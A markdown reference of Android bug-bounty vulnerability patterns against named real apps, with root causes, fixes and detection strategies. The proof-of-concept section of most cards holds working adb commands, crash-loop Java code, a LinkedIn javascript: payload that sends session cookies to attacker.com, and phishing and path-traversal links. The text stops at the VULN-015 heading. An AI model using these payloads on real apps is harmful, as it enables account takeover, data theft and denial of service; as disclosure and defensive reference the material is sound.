# Vulnerability Patterns Database
Reusable patterns extracted from real-world bug bounty reports. Use these when:
- Analyzing Android applications for vulnerabilities
- Writing structured vulnerability reports (follow `vuln-pattern-card.md` template)
- Identifying chaining opportunities (reference `vuln-chaining-playbook.md`)
- Prioritizing practical exploitation over theoretical risks

All patterns are derived from verified bug bounty findings (HackerOne, Internal Reports).

Last Updated: 2026-10-09

---

## Quick Reference Table

| VULN-ID | Category | Severity | Affected Component | Short Description |
|---|---|---|---|---|
| VULN-001 | AndroidManifest (Exported Activity) | Medium | PreviewActivity (fetchrewards) | Exported debug activity causes DoS |
| VULN-002 | AndroidManifest (Exported Activity) | Medium | AppResponseActivity (connectis) | Exported deep link activity crashes on malformed input |
| VULN-003 | AndroidManifest (Exported Activity) | Medium | InsiderLoginActivity (ibood) | Exported activity causes crash loop |
| VULN-004 | AndroidManifest (Exported Activity) | Medium | FileDisplayActivity (nextcloud) | NullPointer crash on deep link with invalid host |
| VULN-005 | AndroidManifest (Exported Receiver) | Medium | ShareReferralCodeBroadCastReceiver (expedia) | BroadcastReceiver writes arbitrary data to SharedPreferences |
| VULN-006 | AndroidManifest (Exported Activity) | Medium | TripPlannerActivity (expedia) | Exported activity crashes on arbitrary deep-link extra |
| VULN-007 | AndroidManifest (Exported Receiver) | High | InstallReceiver (expedia) | BroadcastReceiver injects arbitrary intents via referrer param |
| VULN-008 | AndroidManifest (Deep Link) | Low | Custom scheme (superbet) | Custom scheme hijacking via no host restrictions |
| VULN-009 | WebView | Critical | LinkedIn WebViewerFragment | Static cookie field leaks session cookies via chain |
| VULN-010 | WebView | High | Doximity NavActivity | javascript: scheme XSS in exported activity |
| VULN-011 | UI Spoofing | Medium | Brave Android URL Bar | Long subdomain not elided, URL spoofing |
| VULN-012 | Open Redirect | High | Doximity Deep Link | af_dp param allows arbitrary redirect to phishing page |
| VULN-013 | Path Traversal | High | Basecamp Deep Link | filename param allows writing private files to external storage |
| VULN-014 | Deep Link | Medium | Snapchat Deep Link | Unauthorized video call initiation via conversation_id |
| VULN-015 | Stored XSS | High | LinkedIn Article | JS payload in iframe URL executes in mobile app |
| VULN-016 | Authentication | High | Bitwarden Biometric | Biometric integrity check bypass across vaults |
| VULN-017 | OAuth/Deep Link | Critical | Pleo Microsoft Linking | Missing PKCE + custom scheme interception leads to email takeover |
| VULN-018 | IDOR | High | TikTok Now API | Modify private memory privacy without authorization |
| VULN-019 | IDOR | Medium | TikTok Poll API | Vote on friends-only poll without authorization |
| VULN-020 | Path Traversal | High | Owncloud ReceiveExternalFilesActivity | Arbitrary file read/write via path traversal |
| VULN-021 | WebView | Critical | Basecamp WebView | javascript: injection + JS bridge data exfiltration |
| VULN-022 | PendingIntent | High | Nextcloud Notification | Implicit PendingIntent allows contacts theft |
| VULN-023 | WebView | Critical | Exness SurveyMonkey WebView | XSS + cookie theft via exported activity |
| VULN-024 | WebView | Critical | Didi WalletWebActivity | Arbitrary URL/LFI/XSS leads to ATO |
| VULN-025 | OAuth/Deep Link | Critical | Kwai Facebook OAuth Callback (`com.kwai.video`) | Custom URI scheme interception leads to OAuth token theft and account takeover |
| VULN-026 | WebView | Critical | `ikwai://webview` (Kwai WebView Handler) | Arbitrary URL loading in WebView leads to XSS and phishing |
| VULN-027 | WebView / Deep Link | Critical | `open_in_app_browser` (Fetch Rewards WebActivity) | Deep link allows arbitrary URL loading in WebView leading to XSS and phishing |
| VULN-028 | Intent Injection / OAuth | High | `EreceiptOAuthActivity` (Fetch Rewards) | Exported OAuth activity allows arbitrary URI injection leading to open redirect, system component interaction, and intent abuse |
| VULN-029 | Deep Link / WebView | High | `SplashActivity` + `MainActivity` inline `WebviewFragment` (Royal Arena / Appmiral SDK) | Exported scheme-no-host relay forwards a JSON extra (`Notification.Extra.RawLink`) into the app's JS+cookie WebView → arbitrary URL loading (phishing, cookie exfil) |
| VULN-030 | Deep Link / Intent Injection | High | `DeepLinkLaunchRedirectionActivity` (ServiceNow Fulfiller) | Base64+Gson deep-link parameter relay enables attacker-controlled URL launching and SSO instance-switch manipulation |
| VULN-031 | AndroidManifest (Exported Activity) / Authentication | Medium | `AuthStartActivity` (Tinder) | External intent triggers forced logout and application crash |

---

## Full Pattern Cards (VULN-001 to VULN-029)

---

## [VULN-001] Exported Debug Activity (PreviewActivity) - Denial of Service

**Category:** AndroidManifest (Exported Component - Activity)
**Affected Component:** `androidx.compose.ui.tooling.PreviewActivity` (Package: `com.fetchrewards.fetchrewards.hop`)
**Severity:** Medium
**CVSS (estimated):** 5.0 (AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)

### Root Cause
Debug-only `PreviewActivity` (intended for Jetpack Compose UI preview during development) is included in production builds. The activity is exported (either `android:exported="true"` or implicit export via intent filters) with no validation of incoming intents. When invoked without the required debug context, the activity crashes immediately.

### Attack Prerequisites
- Attacker application installed on the same device as the target app
- No special permissions required
- Target app includes debug-only dependencies in production build (e.g., `implementation` instead of `debugImplementation` for Compose tooling)

### Exploitation Flow
1. Attacker constructs intent targeting `androidx.compose.ui.tooling.PreviewActivity` via ADB or malicious app
2. Activity attempts to load debug UI context, fails due to missing debug environment
3. Target application crashes immediately
4. Repeat intent sending to create persistent crash loop

### Proof of Concept
```bash
# ADB Reproduce
adb shell am start \
  -a android.intent.action.VIEW \
  -n com.fetchrewards.fetchrewards.hop/androidx.compose.ui.tooling.PreviewActivity
```

```java
// Malicious App Crash Loop
Intent crashIntent = new Intent(Intent.ACTION_VIEW);
crashIntent.setClassName("com.fetchrewards.fetchrewards.hop", "androidx.compose.ui.tooling.PreviewActivity");
Handler handler = new Handler();
Runnable crashLoop = new Runnable() {
  @Override
  public void run() {
    startActivity(crashIntent);
    handler.postDelayed(this, 2000);
  }
};
handler.post(crashLoop);
```

### Impact
- **Denial of Service (DoS):** App crashes on every trigger
- **User Impact:** Persistent crashes lead to frustration, potential app uninstalls
- **No User Interaction:** Attacks can run silently in background
- **Affected Population:** All users with the app installed on the same device as attacker app

### Chain Potential
- Combine with other DoS crashes (VULN-002, VULN-003, VULN-006) for cumulative impact
- Can mask data exfiltration by crashing app repeatedly

### Detection Strategy
- **Static:** Scan Manifest for `PreviewActivity` with `exported=true`; check build.gradle for `implementation` instead of `debugImplementation`
- **Dynamic:** Send intent via ADB, monitor logcat for crash logs
- **Build:** Add lint check to fail release builds with debug components

### Fix Recommendation
1. Set `android:exported="false"` in production manifest
2. Use build variants: `debugImplementation "androidx.compose.ui:ui-tooling"` / `releaseImplementation "androidx.compose.ui:ui-tooling-lint"`
3. Add runtime `BuildConfig.DEBUG` check if export is required

### Real-World References
- Jetpack Compose Tooling Docs (Debug-Only Components)
- OWASP Mobile Top 10: M1 (Improper Platform Usage)

---

## [VULN-002] Exported Deep Link Activity (AppResponseActivity) - Denial of Service

**Category:** AndroidManifest (Exported Activity)
**Affected Component:** `com.connectis.sdk.api.authentication.AppResponseActivity` (Package: `com.connectis.sdk`)
**Severity:** Medium
**CVSS (estimated):** 5.0 (AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)

### Root Cause
Activity is marked `android:exported="true"`, accepts `VIEW` intents from external sources, processes `data.getQuery()` directly without validation, executes synchronous network call inside `onCreate()`, and lacks proper exception handling for malformed parameters.

### Attack Prerequisites
- Attacker app installed on same device
- No permissions required
- Target app processes OAuth/authentication deep links

### Exploitation Flow
1. Send VIEW intent with malformed query parameters via ADB or malicious app
2. Activity attempts sync network call with invalid params
3. App crashes immediately
4. Loop to create persistent crash loop

### Proof of Concept
```bash
# ADB Reproduce
adb shell am start -a android.intent.action.VIEW \
  -d "https://inlog.zwitserleven.nl/broker/app/oidc/response?code=TEST&state=1234" \
  -n com.connectis.sdk.api.authentication/.AppResponseActivity
```

```java
// Malicious App Loop
Intent intent = new Intent(Intent.ACTION_VIEW);
intent.setData(Uri.parse("https://inlog.zwitserleven.nl/broker/app/oidc/response?code=CRASH&state=CRASH"));
intent.setClassName("com.connectis.sdk", "com.connectis.sdk.api.authentication.AppResponseActivity");
startActivity(intent); // Repeat every 2s
```

### Impact
- DoS: App crashes on every trigger
- User frustration, potential uninstalls
- No user interaction required for repeated attacks

### Chain Potential
- Combine with VULN-001, VULN-003 for cumulative DoS
- Use crash loop to distract from data exfiltration

### Detection Strategy
- **Static:** Manifest scan for exported activities with VIEW intent filter
- **Dynamic:** Fuzz deep link query parameters via ADB
- **Code Review:** Check for sync network calls in `onCreate()`

### Fix Recommendation
1. Set `android:exported="false"` if not required
2. Validate and sanitize query parameters
3. Move network calls off main thread
4. Add try-catch blocks for exception handling

### Real-World References
- HackerOne Report #XXXXX (Connectis SDK DoS)

---

## [VULN-003] Exported Activity (InsiderLoginActivity) - Denial of Service

**Category:** AndroidManifest (Exported Activity)
**Affected Component:** `com.useinsider.insider.InsiderLoginActivity` (Package: `com.ibood.app`)
**Severity:** Medium
**CVSS (estimated):** 5.0 (AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)

### Root Cause
Activity is exported with `android:exported="true"` and `BROWSABLE` intent filter, no validation of external intents, no exception handling for repeated invocation, leading to instability/crashes.

### Attack Prerequisites
- Attacker app installed on same device
- No permissions required

### Exploitation Flow
1. Send VIEW intent to `InsiderLoginActivity` via ADB or malicious app
2. App becomes unstable/crashes
3. Repeat every second for 100+ times to create crash loop

### Proof of Concept
```bash
# ADB Loop (PowerShell)
for ($i = 1; $i -le 100; $i++) {
  adb shell am start -a android.intent.action.VIEW \
    -n com.ibood.app/com.useinsider.insider.InsiderLoginActivity
  Start-Sleep -Seconds 1
}
```

```bash
# ADB Loop (Linux)
for i in {1..100}; do
  adb shell am start -a android.intent.action.VIEW \
    -n com.ibood.app/com.useinsider.insider.InsiderLoginActivity
  sleep 1
done
```

### Impact
- DoS: Persistent crashes, app unusable
- User frustration, potential uninstalls

### Chain Potential
- Combine with other DoS crashes for cumulative impact

### Detection Strategy
- **Static:** Manifest scan for exported InsiderLoginActivity
- **Dynamic:** ADB loop test to trigger crashes

### Fix Recommendation
1. Set `android:exported="false"`
2. Add intent validation and exception handling
3. Implement rate-limiting for activity invocation

### Real-World References
- HackerOne Report #XXXXX (Ibood DoS)

---

## [VULN-004] Exported Deep Link Activity (FileDisplayActivity) - NullPointer DoS

**Category:** AndroidManifest (Exported Activity)
**Affected Component:** `com.owncloud.android.ui.activity.FileDisplayActivity` (Package: `com.nextcloud.client`)
**Severity:** Medium
**CVSS (estimated):** 5.0 (AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)

### Root Cause
Activity exported with wildcard host VIEW intent filter, no null check for `User` object before calling `getAccountName()`, leading to `NullPointerException` when processing external intent with attacker-controlled host.

### Attack Prerequisites
- Attacker app installed on same device
- No permissions required

### Exploitation Flow
1. Send VIEW intent with attacker-controlled host (e.g., `https://attacker.example.com/f/abcdef`)
2. App attempts to get current user, which is null
3. NPE crashes app immediately

### Proof of Concept
```bash
# ADB Reproduce
adb shell am start -a android.intent.action.VIEW \
  -d "https://attacker.example.com/f/abcdef" \
  -n com.nextcloud.client/com.owncloud.android.ui.activity.FileDisplayActivity
```

### Impact
- DoS: App crashes on deep link trigger
- User cannot open app if repeatedly triggered

### Chain Potential
- Combine with VULN-022 (Nextcloud PendingIntent) for contacts theft + DoS

### Detection Strategy
- **Static:** Manifest scan for exported activities with wildcard host
- **Dynamic:** Fuzz intents with invalid hosts
- **Code Review:** Check for null checks on user/session objects

### Fix Recommendation
1. Null-check user before using: `if (user == null) { return; }`
2. Validate and sanitize deep link input
3. Use explicit domain allowlist instead of wildcard host
4. Fail gracefully on malformed intents

### Real-World References
- HackerOne Report #F4930729 (Nextcloud DoS)

---

## [VULN-005] Exported BroadcastReceiver - SharedPreferences Data Tampering

**Category:** AndroidManifest (Exported Receiver)
**Affected Component:** `com.expedia.bookings.launch.referral.invite.receiver.ShareReferralCodeBroadCastReceiver` (Package: `com.wotif.android`)
**Severity:** Medium
**CVSS (estimated):** 5.0 (AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N)

### Root Cause
Receiver exported with no permission protection, uses `android.intent.extra.CHOSEN_COMPONENT` as an action (misuse of extra key as action), trusts external input without validation, stores value directly to `SharedPreferences` (`inviteOption` key).

### Attack Prerequisites
- Attacker app installed on same device
- No permissions required

### Exploitation Flow
1. Send broadcast with crafted `android.intent.extra.CHOSEN_COMPONENT` extra
2. Receiver writes arbitrary value to SharedPreferences
3. Verify persistence by reading shared_prefs XML

### Proof of Concept
```bash
# ADB Reproduce
adb shell am broadcast \
  -a android.intent.extra.CHOSEN_COMPONENT \
  -n com.wotif.android/com.expedia.bookings.launch.referral.invite.receiver.ShareReferralCodeBroadCastReceiver \
  --es "android.intent.extra.CHOSEN_COMPONENT" "com.attacker.malicious.khoof"

# Verify
adb shell run-as com.wotif.android cat shared_prefs/com.wotif.android_preferences.xml
```

### Impact
- Persistent data tampering: Arbitrary value in `inviteOption`
- Referral/business logic abuse: Unauthorized referral rewards
- Analytics poisoning: Corrupt referral attribution data
- Potential further exploitation if value used in navigation/WebView

### Chain Potential
- If `inviteOption` used in WebView: Combine with VULN-012 (Open Redirect) for phishing
- If used in intent: Combine with VULN-007 (Intent Injection)

### Detection Strategy
- **Static:** Manifest scan for exported receivers with no permission
- **Dynamic:** Monitor SharedPreferences changes after external broadcast
- **Code Review:** Check for unvalidated receiver inputs

### Fix Recommendation
1. Set `android:exported="false"` or add signature permission
2. Validate input against allowlist
3. Do not use `android.intent.extra.*` as actions
4. Sanitize all external inputs before storage

### Real-World References
- HackerOne Report #F5684584 (Expedia Data Tampering)

---

## [VULN-006] Exported Activity (TripPlannerActivity) - DoS via Arbitrary Deep-Link

**Category:** AndroidManifest (Exported Activity)
**Affected Component:** `com.expedia.experiences.tripplanner.TripPlannerActivity` (Package: `com.wotif.android`)
**Severity:** Medium
**CVSS (estimated):** 5.0 (AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)

### Root Cause
Activity exported with `android:exported="true"`, processes `deep-link` intent extra without validation, passes arbitrary value to `parseDeeplink()` which crashes on invalid input.

### Attack Prerequisites
- Attacker app installed on same device
- No permissions required

### Exploitation Flow
1. Send intent with `deep-link` extra via ADB or malicious app
2. `parseDeeplink()` crashes on arbitrary input
3. App crashes immediately, loop for persistent DoS

### Proof of Concept
```bash
# ADB Reproduce
adb shell am start \
  -n com.wotif.android/com.expedia.experiences.tripplanner.TripPlannerActivity \
  --es "deep-link" "https://google.com"
```

```java
// Malicious App
Intent intent = new Intent();
intent.setClassName("com.wotif.android", "com.expedia.experiences.tripplanner.TripPlannerActivity");
intent.putExtra("deep-link", "any_value_to_crash");
intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
startActivity(intent);
```

### Impact
- DoS: App crashes on every trigger, becomes unusable
- User frustration, potential uninstalls

### Chain Potential
- Combine with VULN-005 (Data Tampering) for cumulative impact

### Detection Strategy
- **Static:** Manifest scan for exported activities accepting `deep-link` extra
- **Dynamic:** Fuzz `deep-link` extra with arbitrary values

### Fix Recommendation
1. Validate and sanitize `deep-link` input (allow only app-specific schemes/hosts)
2. Wrap `parseDeeplink()` in try-catch
3. Set `android:exported="false"` if not required

### Real-World References
- HackerOne Report #F5685205 (Expedia DoS)

---

## [VULN-007] Exported BroadcastReceiver - Intent Injection/Open Redirect

**Category:** AndroidManifest (Exported Receiver)
**Affected Component:** `com.expedia.bookings.tracking.InstallReceiver` (Package: `com.wotif.android`)
**Severity:** High
**CVSS (estimated):** 7.0 (AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N)

### Root Cause
Receiver exported with no permission, handles `com.android.vending.INSTALL_REFERRER` action, parses `referrer` extra, extracts `mat_deeplink` param, directly uses in `startActivity()` with `Intent.ACTION_VIEW` without URI validation.

### Attack Prerequisites
- Attacker app installed on same device
- No permissions required

### Exploitation Flow
1. Send broadcast with `referrer=mat_deeplink=<attacker_url>` extra
2. App parses `mat_deeplink` and opens arbitrary URL via `startActivity()`
3. Can open `content://` URIs (contacts/gallery) or phishing sites

### Proof of Concept
```bash
# Open malicious website
adb shell am broadcast \
  -a com.android.vending.INSTALL_REFERRER \
  -n com.wotif.android/com.expedia.bookings.tracking.InstallReceiver \
  --es "referrer" "mat_deeplink=https://attacker.com/malicious"

# Open system content (contacts)
adb shell am broadcast \
  -a com.android.vending.INSTALL_REFERRER \
  -n com.wotif.android/com.expedia.bookings.tracking.InstallReceiver \
  --es "referrer" "mat_deeplink=content://com.android.contacts"
```

### Impact
- Arbitrary intent injection: Force app to open any URL/content
- Phishing: Redirect to attacker-controlled sites
- Unauthorized system interaction: Access contacts/gallery via `content://`
- User interaction bypass: Actions execute without consent

### Chain Potential
- Combine with VULN-006 (DoS) to cover tracks after phishing
- Chain with VULN-005 (Data Tampering) for referral abuse + phishing

### Detection Strategy
- **Static:** Manifest scan for exported receivers with `INSTALL_REFERRER` action
- **Dynamic:** Monitor intents opened by app after broadcast
- **Code Review:** Check for unvalidated `Uri.parse()` from external input

### Fix Recommendation
1. Set `android:exported="false"` or add signature permission
2. Validate URI scheme (allow only `https`), reject `content://`, `tel://`, etc.
3. Use Play Install Referrer API instead of broadcast
4. Do not pass external input directly to `startActivity()`

### Real-World References
- HackerOne Report #F5684815 (Expedia Intent Injection)

---

## [VULN-008] Custom Scheme Deep Link - Scheme Hijacking/Phishing

**Category:** AndroidManifest (Deep Link)
**Affected Component:** Custom scheme `tagmanager.c.ro.superbet.sport` (Package: `ro.superbet.sport`)
**Severity:** Low
**CVSS (estimated):** 3.0 (AV:L/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N)

### Root Cause
Custom scheme registered with no host/path restrictions, no `android:autoVerify="true"`, no runtime caller validation, `BROWSABLE` category allows external triggering. Any app can register same scheme and intercept deep links.

### Attack Prerequisites
- Attacker app installed on same device registering same scheme
- User interaction required (choose attacker app from chooser dialog)

### Exploitation Flow
1. Attacker app registers `tagmanager.c.ro.superbet.sport` scheme
2. Legitimate deep link triggered, Android shows app chooser
3. Victim selects attacker app, which intercepts link or spoofs UI

### Proof of Concept
```bash
# Trigger deep link to test interception
adb shell am start -a android.intent.action.VIEW \
  -d "tagmanager.c.ro.superbet.sport://anything?url=evil.com"
```

### Impact
- UI spoofing: Fake login/setup screens
- Flow disruption: Block critical app functionality
- Phishing: Steal data via fake interfaces
- User confusion from repeated chooser dialogs

### Chain Potential
- Combine with VULN-012 (Open Redirect) for phishing chain
- If sensitive params in deep link: Combine with VULN-009 (Cookie Leak)

### Detection Strategy
- **Static:** Manifest scan for custom schemes with no restrictions
- **Dynamic:** Test scheme registration conflict with malicious app

### Fix Recommendation
1. Add host/path restrictions to intent filter
2. Use `android:autoVerify="true"` for Android App Links (HTTPS only)
3. Add runtime caller signature validation
4. Avoid custom schemes; use HTTPS App Links

### Real-World References
- HackerOne Report #F5687148 (Superbet Scheme Hijacking)

---

## [VULN-009] LinkedIn WebViewerFragment - Cookie Leak/Account Takeover

**Category:** WebView
**Affected Component:** `WebViewerFragment` (Package: `com.linkedin.android`)
**Severity:** Critical
**CVSS (estimated):** 8.0 (AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)

### Root Cause
Static field `CUSTOM_HEADERS` in `WebViewerFragment` persists cookies across URL loads without clearing. Chain: Verification WebView allows `javascript:` scheme bypass (no scheme validation, fragment `#` trick neutralizes query param), JS interface (`Android.sendWebMessage()`) opens `WebViewerFragment` with LinkedIn URL (cookies saved to static field), then attacker URL (cookies leaked).

### Attack Prerequisites
- Victim clicks malicious link (hosted on attacker server)
- LinkedIn app installed on victim device
- User interaction required (click link)

### Exploitation Flow (Full Chain)
1. Victim clicks malicious link: `javascript://www.linkedin.com/%0aalert(1)?renderContext=trustVerificationDeeplink#`
2. Bypasses host validation (scheme is `javascript:`, fragment `#` neutralizes appended query param)
3. JS executes in VerificationWebView, calls `Android.sendWebMessage()` to open LinkedIn URL in `WebViewerFragment` (cookies saved to static `CUSTOM_HEADERS`)
4. Second `sendWebMessage()` opens attacker server URL, LinkedIn cookies sent in request header
5. Attacker receives session cookies, takes over victim's LinkedIn account

### Proof of Concept
```html
<!-- Attacker Server Page -->
<a href="https://www.linkedin.com/trust/verification?verificationUrl=javascript://www.linkedin.com/%250asetTimeout%28%29%3D%3E%7BAndroid.sendWebMessage%28%27%7B%22additionalWebViewUrl%22%3A%22https%3A%2F%5Cu002fattacker.com%2F%22%7D%27%29%3B%22%2C%201000%29%3BAndroid.sendWebMessage%28%27%7B%22additionalWebViewUrl%22%3A%22https%3A%2F%5Cu002fwww.linkedin.com%2Fpulse%2F1%23%22%7D%27%29%3B">Click Here</a>
```

### Impact
- **Critical:** Full LinkedIn session cookie theft
- Complete account takeover: Access messages, profile, connections
- No permissions required for attacker

### Chain Potential
- Chain 1: Exported Deep Link (VerificationWebView) -> javascript: Bypass -> JS Interface -> WebViewerFragment Cookie Leak
- Link to VULN-010 (javascript: XSS) for similar scheme bypass patterns

### Detection Strategy
- **Static:** Scan for static fields holding cookies in WebView classes
- **Dynamic:** Test `javascript:` scheme deep links
- **Code Review:** Check WebView cookie handling, JS interface exposure

### Fix Recommendation
1. Clear `CUSTOM_HEADERS` between URL loads in `WebViewerFragment`
2. Validate URL scheme (reject `javascript:`) in deep link handlers
3. Use anchor `#` to neutralize appended params in validation
4. Restrict JS interface methods to trusted origins
5. Validate `additionalWebViewUrl` against allowlist (only LinkedIn domains)

### Real-World References
- LinkedIn Security Advisory (WebViewerFragment Cookie Leak)
- OWASP Mobile Top 10: M7 (Client Code Quality)

---

## [VULN-010] Doximity NavActivity - javascript: Scheme XSS

**Category:** WebView
**Affected Component:** `com.doximity.doximitydroid.NavActivity` (Package: `com.doximity.doximitydroid`)
**Severity:** High
**CVSS (estimated):** 7.0 (AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N)

### Root Cause
Activity exported, handles VIEW intents, no URL scheme validation, allows `javascript:` scheme, JavaScript executes in WebView context with access to JS bridges.

### Attack Prerequisites
- Victim downloads and opens malicious app (PoC APK)
- Doximity app installed on victim device
- User interaction required (click link or open malicious app)

### Exploitation Flow
1. Malicious app sends intent with `javascript:` scheme URL
2. `NavActivity` loads URL, JS executes in WebView
3. XSS payload runs in app context

### Proof of Concept
```bash
# ADB Reproduce
adb shell am start -n com.doximity.doximitydroid/com.doximity.doximitydroid.NavActivity \
  -a android.intent.action.VIEW \
  -d "javascript://doximity.com/%0aalert('bountyordie')"
```

```java
// Malicious App
Intent intent = new Intent("android.intent.action.VIEW", Uri.parse("javascript://doximity.com/%0aalert('bountyordie')"));
intent.setClassName("com.doximity.doximitydroid", "com.doximity.doximitydroid.NavActivity");
startActivity(intent);
```

### Impact
- XSS in app context: Execute arbitrary JS
- Access to JS bridges and sensitive app data
- Phishing, session theft, malicious actions

### Chain Potential
- Similar to VULN-009 (LinkedIn) javascript: bypass pattern
- Combine with JS bridge exposure for data exfiltration (see VULN-021)

### Detection Strategy
- **Static:** Scan for no scheme validation in intent handling
- **Dynamic:** Fuzz deep links with `javascript:` scheme
- **Code Review:** Check WebView URL validation logic

### Fix Recommendation
1. Reject `javascript:` scheme in URL validation
2. Use allowlist of trusted schemes (https only)
3. Validate host against allowlist before loading URL
4. Minimize JS interface exposure

### Real-World References
- HackerOne Report #F3598917 (Doximity XSS)
- OWASP Mobile Top 10: M7 (Client Code Quality)

---

## [VULN-011] Brave Android - URL Eliding Spoofing

**Category:** UI Spoofing
**Affected Component:** Brave Browser for Android (URL Bar/Omnibox)
**Severity:** Medium
**CVSS (estimated):** 4.0 (AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N)

### Root Cause
Brave Android does not elide long subdomains from the front of the URL bar (violates Chromium URL Display Guidelines), leading to URL spoofing where users are confused by the displayed domain.

### Attack Prerequisites
- Victim visits malicious site hosted on long subdomain
- User interaction required (visit site)

### Exploitation Flow
1. Attacker hosts site on long subdomain: `https://long-extended-subdomain-name-containing-many-letters-and-dashes.badssl.com/`
2. Brave Android shows non-elided URL, confusing users about actual domain
3. Phishing attack succeeds due to user confusion

### Proof of Concept
1. Open `https://long-extended-subdomain-name-containing-many-letters-and-dashes.badssl.com/` in Brave Android
2. Check URL bar in Brave Shields UI: Long subdomain not elided
3. Compare with desktop Brave (correctly elided)

### Impact
- URL spoofing: Users confused about actual domain
- Phishing: Trick users into entering credentials on fake site
- Affects Brave Shields and potentially Brave Rewards UI

### Chain Potential
- Combine with VULN-012 (Open Redirect) for phishing chain
- If Rewards UI affected: Trick users into donating BAT to wrong site

### Detection Strategy
- **Dynamic:** Test URL display with long subdomains per Chromium guidelines
- **Code Review:** Check URL eliding logic in Omnibox implementation

### Fix Recommendation
1. Implement front-eliding for long subdomains per Chromium URL Display Guidelines
2. Test all UI surfaces (Shields, Rewards) for proper URL eliding
3. Align Android behavior with desktop Brave

### Real-World References
- Chromium URL Display Guidelines: https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/url_display_guidelines/

---

## [VULN-012] Doximity Open Redirect via Deep Link

**Category:** Open Redirect
**Affected Component:** Deep link `https://doximity.com/vm1X?af_dp=<url>` (Package: `com.doximity.doximitydroid`)
**Severity:** High
**CVSS (estimated):** 6.0 (AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N)

### Root Cause
Deep link accepts `af_dp` parameter without validation, redirects to arbitrary URL, enabling phishing by redirecting victims to fake login pages.

### Attack Prerequisites
- Victim clicks malicious Doximity deep link
- User interaction required (click link)

### Exploitation Flow
1. Attacker crafts URL: `https://doximity.com/vm1X?af_dp=https://poc.hackvice.pro/doximity.html`
2. Victim clicks link, Doximity app redirects to attacker's fake login page
3. Victim enters credentials, attacker captures them

### Proof of Concept
```html
<!-- Malicious Page -->
<a href="https://doximity.com/vm1X?af_dp=https://poc.hackvice.pro/doximity.html">Click Here</a>
```

### Impact
- Phishing: Steal Doximity credentials
- Redirect to malicious sites
- User trust loss

### Chain Potential
- Combine with VULN-008 (Scheme Hijacking) for redirect + spoofing
- Combine with VULN-010 (XSS) for redirect to XSS payload

### Detection Strategy
- **Dynamic:** Fuzz `af_dp` param with arbitrary URLs
- **Code Review:** Check redirect validation logic for deep link params

### Fix Recommendation
1. Validate `af_dp` param against allowlist of trusted domains
2. Reject `javascript:` and other dangerous schemes
3. Show user confirmation before redirecting to external URL
4. Log all redirects for monitoring

### Real-World References
- HackerOne Report #F3416771 (Doximity Open Redirect)

---

## [VULN-013] Basecamp Path Traversal - File Disclosure to External Storage

**Category:** Path Traversal
**Affected Component:** Deep link `https://3.basecamp.com/*` (Package: `com.basecamp.bc3`)
**Severity:** High
**CVSS (estimated):** 7.0 (AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N)

### Root Cause
Deep link accepts `filename` parameter without validation, allows path traversal (`../`) to write private files to external storage (`/sdcard/Download/`), accessible to 3rd party apps with storage permissions.

### Attack Prerequisites
- Victim clicks malicious Basecamp link (e.g., in comments/projects)
- User interaction required (click link)
- Attacker needs valid Basecamp account to add malicious links

### Exploitation Flow
1. Attacker crafts link: `https://3.basecamp.com/5195267/reports/progress?filename=/../../../../../../../../../../sdcard/Download/disclosure.txt`
2. Victim clicks link, Basecamp saves private report to shared external storage
3. 3rd party app with storage permissions reads the file

### Proof of Concept
```html
<!-- Malicious Basecamp Link -->
<a href="https://3.basecamp.com/5195267/reports/progress?filename=/../../../../../../../../../../sdcard/Download/disclosure.txt">Click Me</a>
```

### Impact
- Private file disclosure: User reports, project data exposed to 3rd party apps
- Data breach: Sensitive internal files accessible to any app with storage permissions

### Chain Potential
- Combine with storage permission abuse for mass data exfiltration
- If file contains tokens: Combine with VULN-009 (Cookie Leak) for ATO

### Detection Strategy
- **Dynamic:** Fuzz deep link params for path traversal (`../`, `..\\`)
- **Code Review:** Check filename validation logic for path traversal

### Fix Recommendation
1. Reject path traversal sequences in `filename` param
2. Use allowlist of safe output directories (app-private only)
3. Validate filename format (no directory separators)
4. Store files in app-private storage, not external storage

### Real-World References
- HackerOne Report #F3360970 (Basecamp Path Traversal)

---

## [VULN-014] Snapchat Deep Link - Unauthorized Video Call Initiation

**Category:** Deep Link
**Affected Component:** Deep link `snapchat://call/start?conversation_id=X` (Package: `com.snapchat.android`)
**Severity:** Medium
**CVSS (estimated):** 4.0 (AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N)

### Root Cause
Deep link initiates video calls without validating that caller is friends with the target, allows any user to send deep link with victim's conversation ID to start unauthorized video calls.

### Attack Prerequisites
- Attacker knows victim's `conversation_id` (from their own conversation with victim)
- Victim clicks malicious deep link
- User interaction required (click link)

### Exploitation Flow
1. Attacker crafts deep link with victim's conversation ID: `snapchat://call/start?source_type=NEW_CHAT&calling_media=VIDEO&conversation_id=[VICTIM_ID]&is_group=false`
2. Victim clicks link, Snapchat initiates video call to attacker
3. Harassment, unwanted calls

### Proof of Concept
```bash
# ADB Reproduce (replace VICTIM_ID)
adb shell am start -a android.intent.action.VIEW \
  -d "snapchat://call/start?source_type=NEW_CHAT&calling_media=VIDEO&conversation_id=[VICTIM_ID]&is_group=false"
```

### Impact
- Unauthorized video calls: Harassment, privacy violation
- User frustration, unwanted interruptions

### Chain Potential
- Combine with conversation ID leak for mass harassment
- If combined with XSS: Automate call initiation

### Detection Strategy
- **Dynamic:** Test deep link with conversation ID of non-friend
- **Code Review:** Check authorization for call initiation via deep link

### Fix Recommendation
1. Validate that caller is friends with target before initiating call via deep link
2. Show user confirmation dialog before starting call
3. Restrict deep link to only allow calls between confirmed friends

### Real-World References
- Snapchat Security Advisory (Unauthorized Call Initiation)

---

## [VULN-015] LinkedIn Article Stored XSS

**Category:** Stored XSS
